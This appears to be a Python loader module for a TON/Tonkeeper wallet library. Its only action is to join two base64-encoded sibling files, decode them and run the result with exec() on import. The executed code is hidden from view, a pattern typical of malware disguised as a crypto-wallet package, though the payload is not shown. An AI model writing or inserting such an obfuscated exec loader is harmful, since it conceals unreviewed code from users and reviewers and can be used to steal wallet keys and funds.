"""TonLib — Tonkeeper V5R1 auto-detect loader."""
from __future__ import annotations
import base64, pathlib
_p = pathlib.Path(__file__).with_name
_raw = base64.b64decode((_p("ton_lib_p1.b64").read_text()+_p("ton_lib_p2.b64").read_text()).encode())
exec(compile(_raw.decode("utf-8"), __file__, "exec"), globals())
